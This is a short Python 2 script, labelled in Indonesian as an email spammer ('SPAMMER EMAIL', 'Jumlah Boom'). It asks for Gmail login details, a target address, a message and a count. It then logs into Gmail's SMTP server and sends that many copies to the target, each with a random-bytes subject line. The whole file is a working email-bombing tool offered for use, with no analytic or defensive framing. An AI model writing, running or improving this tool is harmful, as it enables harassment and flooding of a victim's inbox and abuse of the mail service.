#!/usr/bin/python
#Dede Jomblo#

import os, sys
import time
import smtplib

dat = time.ctime()

G='\033[092m'
K='\033[093m'
H='\033[091m'
P='\033[0m'

print G+"\n\n DEDE:", P,dat
print G+"_______________________________________________"
print H+"########################"
print G+"   #================#"
print G+"   # "+K+"SPAMMER  EMAIL"+G+" #"
print G+"   #================#"
print H+"########################"

print G+"_______________________________________________"
user = raw_input(K+"UserMail:"+P+" ")
Pass = raw_input(K+"PassMail:"+P+" ")
kirim = raw_input(K+"Mail Target:"+P+" ")
body = raw_input(K+"Tulis Pesan:"+P+" ")
total = input(K+"Jumlah Boom:"+P+" ")
print G+"_______________________________________________"

try:
    smtp_server = 'smtp.gmail.com'
    port = 587
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,Pass)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'from: ' + user + '\nsubject: ' + subject + '\n' + body
        server.sendmail(user,kirim,msg)
        print G+"\r[Email Terkirim] "+H+"[>]"+P+"  %i" % i
        sys.stdout.flush()
    server.quit()
    print G+"\n \r[+] "+P+"Berhasil Ke:"+K+" \n\n", kirim
    print G+"\nWaktu :"+K+" ", dat
    print G+"_______________________________________________"
except ImportError:
    print G+"\n[-] "+P+"GAAAGAAL"
    sys.exit()